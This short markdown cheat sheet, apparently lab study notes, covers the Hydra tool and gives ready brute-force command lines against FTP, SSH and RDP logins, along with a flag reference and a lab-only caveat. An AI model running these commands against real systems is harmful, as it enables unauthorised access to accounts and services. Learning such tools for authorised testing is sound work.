# Hydra

## What is Hydra?

Hydra is a tool used for brute force attacks to find usernames and passwords.

---

## Basic Usage

```bash
hydra -l username -P passwords.txt target service
```

---

## FTP Brute Force

```bash
hydra -l admin -P passwords.txt ftp://target
```

---

## SSH Brute Force

```bash
hydra -l root -P passwords.txt ssh://target
```

---

## RDP Brute Force

```bash
hydra -L users.txt -P passwords.txt rdp://target -s 3389
```

---

## Example

```bash
hydra -l admin -P passwords.txt ftp://target
```

---

## Notes

* -l → single username

* -L → username list

* -p → single password

* -P → password list

* Can be noisy and detected

* Use in lab environments only

> Tested during labs
